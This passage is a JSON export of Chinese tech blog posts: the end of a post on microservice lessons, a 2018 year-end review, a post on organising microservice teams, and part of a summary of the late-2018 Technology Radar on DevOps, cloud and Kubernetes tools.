化的需要，就自己研发出了一套很先进的容器管理平台，但是就憋在自己手里，不开源。后来的故事就是，它们把自己辛苦研制的容器管理平台换成了 Kubernetes。所以当你一开始做这种工具，就要考虑它的研发成本和替换成本，减少这个成本的一个方式就是开源。在全球范围内，我们去编写软件构造技术壁垒是没有意义的，因为总会有一个人把好的方案开源出来。然后成为大家竞相模仿的对象，而后形成事实上的标准。\n在这种情况下，如果你的团队有想开发统一工具的一点点动向，请首先考虑业界有没有成熟的开源方案。造轮子、卸轮子和换轮子的成本都很高。软件行业发展这么多年，天底下并不会有特别新鲜的事情。\n越来越厚的微服务平台 #统一化工具的另一个方面就是微服务平台。统一化工具给了我们一套开发的规范，而微服务平台给我们了一个透明的基础设施。\n我们的客户成立了“熊猫团队”（PandA，Platform AND Architecture 平台和架构团队）来降低微服务的部署和发布的门槛。这往往是由于 DevOps 的“二次分裂”产生的。当 DevOps 的应用越来越广泛之后，开发和运维的边界从模糊再一次变得清晰。使得开发应用越来越快，越来越标准化。另一方面，运维部门会把所有的服务都 SaaS 化并提供统一的规范来降低管理的成本。\n随之而来的是另外一个问题：当我们使用流程、工具，应用更多平台的概念的时候。我们会发现，整个工作流程可能变得不再敏捷了。在敏捷里，我们说个体和互动高于流程和工具。在这个情况下，我们会增加越来越多的流程和工具，从而减少个体和互动。\n我们在之前强调敏捷的时候，认为敏捷宣言的的左项和右项是对立的。但是现在我们回顾敏捷宣言，我们可不可以两者同时有？既提升个体和互动，又有流程和工具。从这个角度想的时候，我们就会创造新的工具、新的方法论解决它的矛盾。\n这就是我所说的后 DevOps 时代，我们运维团队变成内部的平台产品团队，它在给开发团队提供一个基础设施产品。而开发团队变成了一个外部的应用产品团队，它在给用户提供一个满足业务需求的产品。彼此独立但又保持 DevOps 生命周期的完整性。\n最后 #以上是我对这个客户 5 年来微服务改造过程中的部分观察，作为微服务改造的亲身经历和见证者，我有幸观察到了一个组织是如何通过微服务从内而外发生变化的。在我的经历里，微服务是 DevOps 深入的必然结果。当我们的部署和发布遇到了瓶颈，就需要采用低成本且可靠的方式分离关注点和风险点，调整应用的架构以进一步提升 DevOps 的反馈。\n当我们开始实践微服务的时候，首先得先统一微服务的认识，让大家对微服务有统一的理解。其次是了解我们为什么要做微服务？微服务解决了你的什么问题，而不是陷入了盲目的技术崇拜中。\n","date":"February 17, 2019","permalink":"/blog/2019/2019-02-17-rethink-of-microsevice/","section":"Blogs","summary":"","title":"微服务演进中的经验和反思"},{"content":"2018年12月31日 23点50分，我把最后一篇稿件发到 GitChat 上之后，我合上了电脑，准备入睡。这是我 2018 年的个人看板上的倒数第二件事。最后一件事就是这一篇年终总结。受“蔡加尼克效应”的影响，2018年1月1日开始，除了工作时间，剩下的一周所有我都在构思这篇年终总结该如何写。然而，几次起笔和修改都不能让我满意。\n简单总结如下：\n2018 年的产出 #2018 年参加了大大小小的分享共计12场，北京、上海和深圳，平均每月一场，详情见：https://wizardbyron.github.io/slides/，PPT 都可以免费下载。\n发表了 15 万字，共计 24 篇，平均每月1篇5000字左右文章，大部分都在简书和 GitChat\n自己研发了三个线下课程：AWS 架构实战工作坊、持续交付、微服务。从敏捷，到持续交付，到 DevOps，再到微服务。我计划 2019 年丰富这些线下课程。\n两个在线课程：DevOps 落地实战、DevOps 从入门到精通（ThoughtWorks 社区），翻新 DevOps 转型实战课程，增加更细致的案例和动手实践，内容会比以前丰富 5 倍左右。\n参与编写两个标准：DevOps 标准、微服务标准。都还是征求意见稿，2019年将继续完善。\n开发了两个开源软件，2019年要继续完善，0.1.0 Release\nvivian，详见 测试驱动开发 Nginx 配置\nwade，详见 一怒之下，我写了一个开源流量测试工具\n其次是一点感想 #有产品要学做产品经理，没有产品要创造产品做产品经理。我拿自己的产出作为试验田，开始习练我之前学习过的理论。\n2018 年初调整了年初的个人商业模式画布，拓展了渠道并加深了合作。丰富了产品类型：从文章、到视频课程，从大会分享到线下课程。这样可以接触更多的客户和用户，进一步了解市场的信息。所以我重新调整了2018的关注点，收效不错。从 2018 年的反馈来看，2019 年需要更新自己的产品线：DevOps、微服务和云计算。\n2018 年重新开通了博客，并把自己过去在简书上写的文章迁移到博客上来。我的博客经历了三次删除（找不到它存在的必要性），终究还是找到它存在的意义了。\n这么多的产出，对于我的意义其实更大。如果你是新入职场的毕业生，建议你立刻养成这样的习惯：将自己的项目和职业生涯积累在一个 PPT 上，这个 PPT 是你整个职业生涯和你自身思想的积累，它会指引你未来的方向，它是你无可取代的核心竞争力。在不断完善它的路上，你也更加完善你自己，换句话说，它是你认识自己价值的最好方式，它能帮你从一而终，能给你方向。很遗憾在自己工作的第十个年头才开始打造自己。不过，任何开始都不会太晚。通过2018年，我更体会到了它的价值，任何时候都有有准备好的材料和他人交流。2019年我仍将继续。\n2018 年开通了公众号，但终究没有好好运营。公众号是一个比其它渠道更直接的交流方式，2019 年我将好好运营它。\n从 2017 年开始，我开始采用 Trello 跟踪我自己的事务，一直很难做到 WIP = 1 和按时完成。但实际上，我的产量比2017年翻了一倍。\n2018 年我离开了 ThoughtWorks，这是一个看似必然但是很偶然的决定。必然的是我发现自己没有办法突破自己的瓶颈期。偶然是因为在我不期而遇的生活变故上带来的一些雪中送炭。可惜的是，我依旧没有给自己的剧本演好一个结局：AWS 的课程 和 DevOps 的课程没有完成，自己跟踪了一年多的项目在上线阶段离开。\n写到这，就这样吧~ 它不再烦我了。\n","date":"January 7, 2019","permalink":"/blog/2019/2019-01-07-annual-review-for-2018/","section":"Blogs","summary":"","title":"迟到的 2018 年终总结"},{"content":"在 成功微服务实施的技术演进里我们介绍了案例中微服务架构演进的技术背景，本文介绍一下这期间发生的组织演进。可以说，一个合适的组织结构是驱动微服务架构成功落地的必要能力。\n在我们如何衡量微服务实施的成功里面，我们介绍到系统的规模会因为维护成本达到极限。这个维护成本中最主要的一个部分就是人员成本和管理成本。而在这个案例里，我们可以看到两个特征：管理层的缩减和生产力的提升。\n微服务开发团队的演化过程 #在最开始的时候，我们的产品分为两类团队，如下图所示：\n一类是维护现有产品的团队，我们称之为“BAU （Business As Usual）团队”。这样一个团队用来修复 Bug、清理技术债、并对生产需求快速响应，有时候也做一些小于一个迭代（2周）的需求。可以说是一些重要又紧急的事情。在代码库上负责对代码主干和hotfix（快速修复）分支进行更改。\n另一类团队是功能团队，又称特性团队。这样的团队有多个，都是按照不同的新特性和新需求组建的团队。团队大小根据需求的规模和项目的周期决定。每个团队都有一个特性分支，这个特性分支采用单主干开发。在开发的过程中会每天把master 分支合并到自己的分支上，以降低未来合并的痛苦。\n待特性开发团队完成了一个项目或者一个特性的开发后，代码合并到主干，开始进行1~3个月的维护期，这个期间特性团队解散并入BAU团队。而之前 BAU 团队的成员开始准备成立新的特性开发团队了。\n由于代码是“全民所有制”，每个人都会对所有的代码质量负责，而不是自己负责的那一小块。而且每个团队在 BAU 项目上工作的时候，可以学习到完整的业务知识和开发实践。因此 BAU 团队也适合培养刚加入团队的新人。\n在这样不断的轮换过程中，每个人都学习到了整个代码库的业务知识，也参与了新特性的开发。\n微服务团队就来自于这样一个特性团队：我们需要为新的微服务新建一个代码库。也需要在原先的代码库上通过创建新的分支来进行修改，把微服务集成到老的系统上去。当微服务部署好之后，新的分支就会被合并到主干，部署后和微服务集成。\n后来，随着需要微服务化改造的系统越来越多，会慢慢演变成下图的样子：\n从宏观上来看，一个企业为了满足各个方面的信息化需求，一定会有很多不同的应用系统。比如财务、人员管理、产品管理、工作流程等。等发展到了一定阶段一定会需要通过技术手段将不同的系统实现数据共享。我们会采用系统集成技术来集成不同的系统，把所有的系统都整合到一起。这里就涉及到了两个问题：\n一个是“Single source of truth”，也就是单一事实来源。我们希望在多系统集成的情况下，某一种数据，例如客户信息、价格，等都有单一的事实来源。否则在不同子系统之间出现数据不一致的情况。\n另外一个就是之前提到的 Design For Failure，在业务正在运行的期间，应用系统的改造不能使当前业务崩溃。因此，我们的任何一个决策都要保持现有业务运行的稳定，一方面是人员组织，另一方面是系统架构。\n图里三个颜色表示三个业务系统，三个业务系统最开始只有 Team A 是做微服务的，它只做一个应用的一小部分，比如 APP-1 的其中一个微服务。而其它的团队还在维护各自的单体应用。他们把所有应用业务切分成不同的微服务并集成，花了三到五年的时间。他们的团队所面对的维护工作量看起更大的了，因为他们需要关注的点更多了，但是它的团队没有增加反而减少了。某些团队被拆散，和其他的团队整合。或者开发了新的业务部门。\n之前在这个公司里面一共有120个开发人员在维护这些系统，包括我们这边和客户那边的，到现在只剩80个人了。过去四年到五年有将近 30% 的人离职去搞比特币或者区块链创业了，当然还有人补充进来。\n然而他们的系统并没有因为要维护这么多模块垮掉，而是这么多人已经足够多了。一开始我们是有运维团队的，第一个微服务团队和这个团队是一起工作的。到后面它又不再去到每一个团队工作了，而是形成一个运维模式，这个团队就是之前文章提到过的“熊猫团队”（PandA，Platform AND Architecture 平台和架构团队）。\n微服务的团队大小的原则 #多大的微服务团队是合适的？下面是我们微服务团队的照片，亚马逊提出两个披萨饼的团队。我们也采用过两个必胜客披萨的团队，但我们发现两个披萨的团队不符合实际。是因为你所碰到微服务的粒度是不一样大的。\n因此，我们组建了“两个桌子间”的团队，如下图所示：\n团队的规模决定了两件事：沟通的成本和微服务的大小\n这两个条件一个决定了团队规模的上限，一个该决定了团队规模的上限。所谓“两个披萨的团队”事实上约束了团队的成本，同样也约束了微服务的规模。如果团队面对的代码库觉得力不从心，你就得缩减一下微服务的规模直到团队能够独立维护这个微服务。如果很多人都空闲，你可以让团队承担多一点代码。\n这张照片是我们的一个微服务团队大概的规模：两个桌子背对背的空间，最大不超过16个人。\n这样的一个空间形成了一个天然的场地：显示器是天然的屏障，你需要转过身来面对大家而不是坐在显示器背后。这样人和人之间不存在阻碍，也没有了秘密。这恰恰是一个团队理想的开会场所，我们在这里开站立会议，并且在一头设置了物理的看板墙，这样团队可以对当前的工作一目了然。\n我们决定微服务团队的大小有三个原则：\n团队的成员相互之间可以随时沟通：两个桌子之间的空地就是我们的会议室，有事随时沟通，同时也不会被隔壁桌子打扰。 不增加额外的管理成本：无需增加管理团队来管理微服务团队，微服务团队的工作责任边界完全自治。 不需要加班即可完成计划的任务：表明当前的工作量对于团队成员来说是合适的。 如果大于这个尺寸，证明你的微服务团队过大，需要进一步拆分。遇之相对应的是你的微服务的开发维护工作量过大，也需要进一步拆分。团队的最好的大小是和微服务的工作量是一致的。\n如果小于这个尺寸，会因为微服务拆分的过小反而增加管理成本。你会发现有很多的团队需要协调，不得不增加协调人员来协调各微服务之间的工作，这就是额外的微服务团队管理成本。\n当然，你可以拥有“两辆轿车”的团队或者“一个大圆桌团队：团队所有人出去吃饭刚好可以坐下两辆轿车，或者可以坐下一个包厢的圆桌。主要还是为了降低团队沟通和决策的成本，增加团队凝聚力。\n从工作量的角度来看，每天的工作量要达到75%以上的时间利用率。也就是说，如果是“朝九晚六”（9:00-18:00）的工作方式，除去午休的一个小时。全天有8个小时的工作时间，起码要保证至少 6 个小时是在微服务的工作上。可以有2个小时左右的时间处理私人和组织的事务。如果微服务团队内部的工作时间小于这个比例，那么就证明组织之间存在额外的沟通成本，这些沟通就是需要被拆分出来的依赖，或者被下放的责任。\n微服务团队中的角色分工 # 作为一个微服务团队组织是什么样的呢？我们的微服务团队是一个全功能的敏捷团队。这样的一个团队除了满足以上的团队大小外，还需要满足“全功能”和“敏捷”两个条件。\n首先，我们是一个全功能的团队，也就意味着我们的团队可以处理整个团队端到端的所有任务，而无需依赖其它团队。这就保证了团队的自治。\n其次，我们是一个敏捷团队，采用敏捷方法论和实践指导微服务的实践。\n我们的角色分工是这样的：\n一名微服务的负责人。这样的团队我们又叫项目经理（PM），又叫MS-MASTER，它是一个复合的角色，不光是经理还是架构师是技术角色。帮我们隔离外部的干扰，例如会议、沟通等……以确保团队可以独立的工作。\n一名业务分析师（BA），而发现需要这么一个角色的过程是经历过惨痛教训的：如果你的团队没有人十分熟悉业务流程和组织结构，划分出来的微服务就会和别的团队有重复。这就违反了单一事实来源的原则，而提前的分析可以避免这一点。而团队内部大部分是开发工程师，两个到14个不等。当然，这样的一名业务分析师可以多个团队共享。不过刚开始的时候，建议一个微服务团队有一个专门的业务分析师和领域专家共同合作。\n一名质量分析师（QA），我们的 QA 不仅仅是做测试的，我们的 QA 还要理解业务，而 QA 是做全流程的质量保障。我们的测试流程是开发工程师写的自动化测试。注意，由于微服务的抛弃成本很低，我们并没有很高的单元测试覆盖率，但是我们要确保对应的端到端测试和集成测试都是大部分被覆盖的。另外我们需要运维工程师来帮我们设计持续部署和在线微服务的监控。此外，由于QA熟悉业务，某种程度上可以替代 BA 的职责。\n一名运维工程师（Ops），帮我们构建基础设施平台并做好配置，以便我们快速部署微服务。这样当需要运维支持的时候，我们就不需要依赖运维团队了。这样一个角色可以是多个团队共有的，它可以在多个团队中寻找一些模式来构建微服务平台或者工具。\n一名技术负责人（Tech Lead），主要负责架构和技术选型，指导其它开发者的开发，某种程度上是可以作为 Ops 。\n若干个开发者（Dev），完成微服务的开发。需要注意的是，这样一个团队包括前端工程师和后端工程师，而不仅仅是前端工程师。\n此外，微服务团队的划分容易出现两个误区：一个是根据系统模块划分团队，另一个是团队只负责某一个微服务。\n前端团队和后端团队：有些情况下，我们会根据技能或者技术栈来区分两类团队。这样的有一个明显的陷阱：两个团队只对微服务的一部分负责。这样的前后端依赖如果没有管理的很好则会出现阻塞。一种解决办法是采用消费者驱动的契约测试来建立前后端之间的开发规范。另外一种办法则是通过全功能团队来消除这种隔阂。微服务团队的 PM、QA 和 BA 共同监督前后端的集成。这时候，前端和后端都要看做统一的微服务，只是集成到不同的网关而已。 按微服务划分团队：另外一个很危险的事情是一个微服务一个团队，这样划分团队的结果会变成更加隔离小团队。每个小团队只关注自己的微服务，而不管的整个业务的场景集成。这时候就需要更多的管理手段来介入，反而增加了更多的管理层使整个组织膨胀。此外，这样会给人一种错觉，我们都是独立发布独立部署的。然而开发需求、特别是集成很多微服务的需求则是需要详细安排开发计划的，这样不考虑业务场景的并行开发只会导致更多的阻塞和延迟，使得端到端的测试成本不断提高，阻碍整个架构灵活的变动。一种错误的技术解决方案是采用多个在线的微服务版本来保证兼容性。但带来的只会是过渡方案的妥协和资源的浪费：为了避免兼容性带来的问题，会在线留存多个版本，谁都不能轻易下线之前的版本。 因此，一个团队能够独立的完成端到端的开发和部署才是微服务团队的黄金原则。\n微服务团队的工作规范和节奏 #树立起微服务的工作规范是很重要的，它能形成文化和模式，替代管理人员将微服务的经验快速扩张。所以微服务的工作规范是需要最早开始确立，并不断在实践中完善的。\n当我们刚开始做微服务的时候，并不知道哪一条微服务路径是更好的。尽管有各种各样的方法论，但在实际过程中还会出现这样那样的问题。所以我们先做一到两个试点，然后去总结出一个模式出来，但是一定要注意不要把它形成一个公共代码库，否则又变成了新的耦合。\n此外，要采用自动化的方式做微服务端到端的部署。最好是除了代码提交和最后灰度发布，中间的所有环节都是自动化的。包括静态扫描、单元测试、构建、制品管理、部署、部署后功能性测试和部署后非功能性测试。要在每个代码库中做到一定的质量规范，以确保每一个微服务上线质量都是有所保障的。\n这样就可以通过自动化落地一个制度，避免人工执行中造成的疏漏和变形。我们是通过“流水线即代码”技术，把交付规范变成了一系列自动化的手段。而且采用了 git hook 的技术，在代码提交前就做自动化测试，避免没有经过测试的代码提交到代码库上。\n在微服务的开发过程中，容易形成“隐性知识”，即只有少部分人知道的知识。\n一个有效的方法是结对编程，但当你碰到项目时间截止、预算截止又加不了人的时候，能够砍掉第一个敏捷实践就是结对编程。但是把眼光放长远看，你会发现结对编程是利用的是短板原理。在你的团队你跟别人面对面工作，如果你一个人工作，你的工作能力不足你是很难感受到的。而和别人一结对，你的工作能力不足你就有了很清晰的认识。这可以让团队成员向高水平的成员学习，不断提高团队的短板。而交付代码的结果永远是水平较高的那个人的。\n而不采用结对编程的团队一般就是末位淘汰制。这个很容易理解，但实际上这种制度只会浪费大家的时间。因为在这样的组织里遵循马太效应，强者愈强，弱者愈弱，这不利于团队的发展，特别是需要复制的微服务团队。\n另外需要说明的一点就是结对编程是非常辛苦但能够提升效率的方式，因为你在写代码的时候，始终有一个人盯着你，你没有时间开小差，你所有时间都在思考、设计。如果你没有这样做的话就是对结对伙伴的不尊重，所以从另外一种角度来看，结对编程实际上是一种监督制度，让对方监督来克服自己的惰性。工作的高效率就是这么形成的。\n单单有结对编程这一点是不够的，还要做微服务团队之间的交换结对（Switch Pair）。\n我们经常会出现一个问题，那就是我们团队有些人水平高，有些人水平低。水平高的人开发一些功能然后离职了，留下一个坑。但是这个风险往往是我们忽视的，我们做交接的时候往往交出去没有接起来，然后又变成另外一个坑。而结对编程是避免坑的有效的手段，但是一定要注意定期交换结对的伙伴。\n为什么呢？持续交付里面有一个很重要的原则叫做尽早并频繁的做一些让你感到痛苦的事情。如果一个团队成员离职交接很痛苦，那每一天做一次交接。这就是结对编程和交换结对伙伴所做的事，因为每一次你做交换结对的的时候都进行了增量的交接，所以交接压力非常小。但是如果某个人做了半年的系统需要交接，这个压力则是非常大的，因为知识量很多。\n从这个角度看，结对编程也是一种组织层面 Design for Failure：任何人的离开都不会对团队的交付产出有大的影响。\n另外一个很重要的环节就是回顾会议。回顾会议非常重要，团队要学会自我改进。特别是微服务团队刚组建的时候，一定要养成复盘的习惯，否则很多问题就会积累，拖累整个微服务团队的工作节奏。这样，我们就可以从一个周期中认识到问题，并且在下一个周期中落实改进。采用这种循环的方式不断提升团队的工作表现。\n此外，你需要给团队充分的授权，如果你不信任你的团队，你的团队也会用不信任的方法对待你。最重要的表现是各种“评审”和“审批”，大家的注意力都在流程上，而不在最终的结果上。最后的结局就是人浮于事，大家都在“做事情”但都没“把事情做完”。\n演进中的组织 #在 Netflix 的微服务经验中，Netflix 的工程师 R. Meshenberg 提出。微服务的落地需要各方面的配合和统一。这就意味着组织结构需要变化，这些变化的落地是困难的，而且这不是技术能够解决的问题。如果我们有一个等级森严，权限隔离的制度，组织的创造性和生产力则会被权力所削弱。因为很多人都希望确定性，避免不确定性。久而久之，就会使一个系统变得很脆弱，而花更大的代价来维护系统的脆弱性。而不是构建一个反脆弱性的系统，使组织更加有弹性，可以面对任何外在环境的变更。\n你需要你的组织能够不断自我演化能够面对各种挑战。而组织结构的变化是往往是微服务落地困难中容易被忽视的一环成功的微服务的组织都是可以自我演进的，它会自我调整并孕育出新的技术。最好的例子也是 Netflix，在他们开始决定做微服务转型的时候，微服务，甚至是 DevOps 的概念还没有出现。然而，Netflix 的自动化和工程师文化，帮助他们成功的进行了技术转型而成为微服务应用中的楷模。\n然而在组织和技术的相互演进中，我们也走过了很多弯路。我也发现，越来越多应用微服务的团队也会犯我们曾经犯过的错误，下一篇我们就来谈谈《微服务演进中的经验和反思》。\n","date":"December 26, 2018","permalink":"/blog/2018/2018-12-26-microservices-org-evo/","section":"Blogs","summary":"","title":"成功微服务实施的组织演进"},{"content":"2018年下半年的技术雷达发布了。看过的朋友可能和我的感觉一样，会发现大部分条目都是和微服务和 DevOps 相关，但这些条目散落在不同的象限里。本文将这些散落在不同象限的条目采用以下 5 个主题进行重组：\nDevOps 合作新实践 云计算新实践 容器新技术 微服务及其误区 安全 特别要提出的是，这期技术雷达采纳了 2018 年的 DevOps 报告 中的四个关键指标(FOUR KEYMETRICS):前置时间，部署频率，平均恢复时间(MTTR)和变更失败百分比。而这四个关键指标也是业界度量 DevOps 效果的统一方式。\n每个指标都创造了一个良性循环，并使团队专注于持续改进:缩短交付周期，减少浪费的活动，从而使你可以更频繁地部署，进而改进他们的实践和自动化流程。通过更好的实践，自动化和监控可以提高你从故障中恢复的速度，从而降低故障频率。\nDevOps 的合作 #如何更好的在组织内合作是 DevOps 实践中永恒不变的的话题。随着 DevOps 合作理念的深入，合作的范围越来越越广，随之带来了新的问题和挑战。这期的技术雷达介绍了以下几方面的合作：\n和外包团队/供应商的 DevOps 合作 和用户/客户/UX设计师的合作 分布式团队之间的合作 和外包团队的 DevOps 合作 #而随着 DevOps 应用的加深，会不可避免的碰到组织结构上带来的问题。特别是和外包方的合作，会影响组织的 DevOps 表现。这样的合作往往充满了漫长繁冗且火药味十足的会议和合同谈判，这是 DevOps 运动中不希望看到的但是又无法避免的问题。在 2018 年的 DevOps 报告中看到外包会带来效能下降——“低效能团队将整部分职能进行外包的可能性几乎是高效能团队的 4 倍，这些 外包功能包括测试或运维等等。”\n看到这里，千万不要得出“不要用外包的结论”。这里说得是不要“职能的外包”，而“端到端的外包”（End-2-End OutSourcing）则会免除这种顾虑。很多业界一流的 IT 服务企业都提供端到端的 IT 外包服务，你只需要告诉它们你要DevOps，它们会用最有效的方式交付给你。与供应商一起增量交付(INCREMENTAL DELIVERY WITH COTS (commercial off-the-shelf)) 就是这期技术雷达中提出的和外包商一起进行 DevOps 策略之一。与供应商的做端到端的 DevOps 性质的外包另外一个优点则是这样的供应商适合做“长期合作伙伴”来补充你业务、IT 等多样性的不足，甚至能够帮你培训员工。\n而随着组织开始采用四个关键指标，这对对供应商的要求也越来越高，但盈利空间相对越来越小。和任何行业一样，成本的降低和效率的提升永远是不变的主节奏。外包也要提升自己的能力水平以跟上技术发展的节奏，这是不可避免的成本。\n但是，和外包方的合作仍然是在 DevOps 转型过程中不可避免的痛苦，可以采用一些方式减轻这种痛苦。例如这期技术雷达中介绍的**“风险相称的供应商策略(RISK-COMMENSURATE VENDOR STRATEGY) ”**，它鼓励在高度关键系统中维持其供应商的独立性。而那些相对不太重要的业务可以利用供应商提供的成熟解决方案，这可以让企业更容易承受失去该供应商所带来的影响。这不光是说 IT 产品供应商，同样也指的 IT 服务供应商。\n“边界购买（BOUNDED BUY）”就是这样一种实践，在采购产品中即只选择模块化、解耦的，且 只包含于单一业务能力(Business Capability)的限界上下文(Bounded Context)中的厂商产品。应该将这种对 模块化和独立交付能力的要求，加入对供应商选择的验收标准中去。也可以将一小部分业务的端到端维护外包出去，在获得灵活性的同时，又获得高效。\n和 UI 的合作 ——DesignOps #DevOps 的目标就是尽可能的缩短最终用户想法到代码之间的距离，避免传递过程中的信息失真。特别是用户的反馈，于是有了 DesignOps 实践。这个领域的实践和工具也日渐成熟。这期的技术雷达介绍的一整套支持 UI 的开发环境(也称为UI DEV ENVIRONMENTS)专注于用户体验设计人员与开发人员之间的协作，例如 :Storybook ，react-styleguidist，Compositor 及 MDX。这些工具大部分围绕 React 的生态圈产生。既可以在组件库或设计系统的开发过程中单独使用，也可以嵌入到 Web应用项目中使用。\n分布式团队的合作 #随着组织的扩大，分布式的团队是一个无法回避的问题。你很可能会和不同地理位置的其它同事一起开发，例如：不同的办公楼，不同的城市，甚至是不同的国家。但这些问题不是 DevOps 的阻碍，可以通过一系列的工具来弥合地理上的界限。\nVisutal Studio Code 目前是最受欢迎的编辑器和开发环境。而 VS Live Share 给分布式的跨地域协作开发的能力，它是用于 Visual Studio Code 与 Visual Studio 的插件。提供实时合作编辑与调试代码、语音通话、共享终端和暴露本地端口等功能，能够减少远程结对编程时遇到的障碍。开发人员可以在使用Live Share 协作时沿用自己的编辑器配置，包括主题、快捷键和扩展。\n云计算新实践 #如果你仔细看技术雷达，这期的技术雷达把 AWS，Azure 和 Google Cloud Platform 这三个世界上最大的云计算供应厂商放到了 Trail（试验）象限。这说明在采用云计算的时候，需要注意防止被云供应商绑定。从这个角度来说，Kubernetes 这样平台无关的技术要更好。\n设置多云账号(MULTI-ACCOUNT CLOUD SETUP)可以避免被单一的云供应商绑定，可以平衡的结合采用多个云平台的优势来动态的配置你的云计算经验。\nCHAOS KATAS 是一项为基础设施和平台工程师提供技能培训和提升的技术。它将 Kata （我个人更倾向于把 Kata 翻译为 套路）的方法论与Chaos Engineering 的相关技术(具体指在受控环境中模拟故障和停机)进行结合，对工程师进行系统化教学和培训。这里的 Kata 是指触发受控故障的代码模式，它允许工程师发现问题，恢复故障，开展事后分析并找到根本原因。工程师通过重复执行Kata能帮助他们真正掌握新的技能。\n用基础设施即代码提升基础设施的质量 #管理云计算资源最有效的形式是采用基础设施即代码技术。在这一方面，早期的 Chef，Puppet 已被 Ansible、Salt 等取代。而后继之秀 Terraform 则简化了很多的云计算平台上的基础设施配置工作。现在，Terraform 已经成为公有云基础设施即代码的第一选择。这期的技术雷达介绍了Terragrunt，它是Terraform 的一个轻量级的封装，用来落地《 Terraform: Up and Running 》书中主张的实践。当然，在采用它之前你可以先读一下这本书。\n如果你使用了 AWS，并且向通过编程的方式生成基础设施即代码。你可以使用Troposphere，Troposphere 是一个Python 库，可以使用 Python 代码生成 JSON 格式的 CloudFormation 描述。这样的代码的复用性和设计都会很好，同时它也有类型检测、单元测试以及 DRY 组合 AWS 资源等功能。\u0010\n在云原生的环境下，跨平台，跨实践的基础设施即代码技术将成为下一个基础设施即代码的发展方向。Pulumi就是这样一款“云原生即代码”工具，它提供了一个云原生开发平台，为所有的云原生应用通过一致的编程模型和统一的DevOps实践，帮助团队大幅提升生产力，并以很快的速度将代码迁移到云中。\n结合往期的技术雷达，可以看出，在有效的采用基础设施即代码的技术上，除了版本化和自动化以外，基础设施即代码正在向可测试性和合规性的方向发展。对基础设施质量的度量和检测可以通过基础设施即代码来实现。而除了公有云平台，很少可以见到企业对私有的基础设施质量的关注。和软件产品一样，基础设施也会存在技术债，而这些技术债会引发应用程序的技术债的连锁效应。比如，你采用了老旧的设备和老旧的操作系统，在缺乏管理的情况下，网络、安全甚至是性能问题越来越凸显，而系统会越来越脆弱。\nKubernetes 和容器 #Kubernetes 已经是容器生态的核心，因为除了 Docker 以外，还有其它的替代容器方案可以选择。但编排方案的选择却不会太多。为了保持容器镜像的大小，大家往往会采用 Alpine 和 Busybox 这样袖珍的镜像作为基础镜像。避免安装和配置那些无用的软件包和SDK。现在有了 DISTROLESS DOCKER IMAGES 这样的选择，可以被翻译做 “非发行版的 Docker 镜像”，它由 Google 开发，并给每种语言运行时都建立了\u0010发行版无关的镜像，兼顾了安全性和大小两方面。\n在 Kubernetes 运维方面，这期的技术雷达新增了两个工具。Kube-Bench 和 Heptio ARK。前者是大名鼎鼎的 K8S 机器学习社区 Kubeflow 推出的一款基础设施配置扫描工具，基于 K8S的 CIS 评分自动检查 Kubernetes 配置，涵盖用户身份验证，权限控制和数据安全等方面。后者是Kubernetes 跨云的解决方案厂商 Heptio 推出的一个集群和持久化卷的灾难恢复管理工具。使用 Ark 可以显著缩短基础架构发生故障时的恢复时间，还能轻松地将 Kubernetes 资源从一个集群迁移到另一个集群，或者复制生产环境用于测试和排错。Ark支持主流的云存储提供商(包括 AWS ，Azure 和 GoogleCloud )，并且从版本0.6.0开始，提供了插件系统用于兼容其他备份与卷存储平台。虽然 GKE 等 Kubernetes 托管环境已经提供了这类服务，但如果需要自行运维 Kubernetes ，不论是在本地还是云端，都请仔细考虑使用 Heptio Ark 进行灾难恢复。\nRook 是一款运行在Kubernetes集群中的开源云原生存储编排工具，现在仍然在CNCF 进行孵化。与Ceph集成之后的Rook，能将文件、块和对象存储系统引入到 Kubernetes 集群中，并能与使用这些存储的其他应用和服务一起无缝地运行。通过使用一些 Kubernetes operator，Rook可以在控制层上编排Ceph，这样就可以避免挤占应用程序和Ceph之间的数据通道。\nKubernetes 一直是 无服务器架构（Serverless Architecture）的理想平台，围绕着 Kubernetes 已经有了很多 Serverless 解决方案，如 Kuberless 和 OpenFaaS。Knative 是 Google 推出的基于 Kubernetes Serverless 方案，你可以把它部署在任何 Kubernetes 集群上。\nService Mesh 提供一致的发现、安全性、跟踪、监控和故障处理，而无需共享API网关或ESB等设施。典型的实现是将每个服务进程和轻量级反向代理以Side-Car 的方式一起部署，反向代理进程可能在单独的容器中。这些代理与服务注册表，身份提供者，日志聚合器和其他服务进行通信。服务互操作性和可观测性是通过此代理的共享实现而不是共享运行时实例获得的。\n随着集中式的微服务网关和服务注册/发现机制的逐渐臃肿，Service Mesh 会接起微服务规模化的接力棒。随着 Linkerd 和 Istio 等开源项目将逐步成熟，这使得 service mesh 更容易实现。目前 Istio 仍遭受了来自性能方面的担心，但我相信在某些场景下，这些性能损耗是可以被复杂性平衡的。\nKubernetes 生态圈的发展一直围绕着微服务进行的。所以，结合微服务技术的发展更可以看清Kubernetes的发展轨迹。\n微服务及其误区 #微服务的实践正在渡过深水区，判断的依据很简单：关于微服务的工具出现的越来越少，而实践和经验越来越多。这表明很多不会有很多新的通用问题需要解决。事件风暴(EVENT STORMING) 被放入了“采用”环中，这意味着事件风暴将作为微服务实践的核心技术之一。事件风暴是一项团队活动，旨在通过领域事件识别出聚合根，进而划分微服务的限界上下文。在活动中，团队先通过头脑风暴的形式罗列出领域中所有的领域事件，整合之后形成最终的领域事件集合，然后对于每一个事件，标注出导致该事件的命令（Command），再然后为每个事件标注出命令发起方的角色，命令可以是用户发起，也可以是第三方系统调用或者是定时器触发等。最后对事件进行分类整理出聚合根以及限界上下文。事件风暴还有一个额外的好处是可以加深参与人员对领域的认识。\n在微服务的应用中，分布式追踪一直是一个困扰人们很久的问题。CNCF 的 Jaeger 的机制同样来源于谷歌的 Dapper，并遵循 OpenTracing 。它在 Kubernetes 集群中安装它也很简单，它可以和Istio 配合使用，在 Kubernetes 集群中与 Envoy集成进行应用程序追踪。而 CNCF 所提供的工具渐渐会和 Spring Cloud 这种微服务全家桶的解决方案结合，变成未来微服务架构的基准参考模型。\n除了 Java 社区以外，其它语言的社区也跃跃欲试。例如这一期技术雷达介绍的 Ocelot，它是基于.NET Core实现的轻量级API网关项目，它可以通过轻松的配置来实现路由转发、请求聚合、服务发现、认证授权、限流熔断、负载均衡等特性，它还集成了Service Fabric、Consul、Eureka等功能。目前 Ocelot 的功能已经相当完整，它在.NET Core社区的活跃度也很高。目测能够作为未来 .NET 社区微服务实践的首选。\n而在 Python 社区，出现了一个超轻量级的微服务框架 NameKo，它也是 Flask的 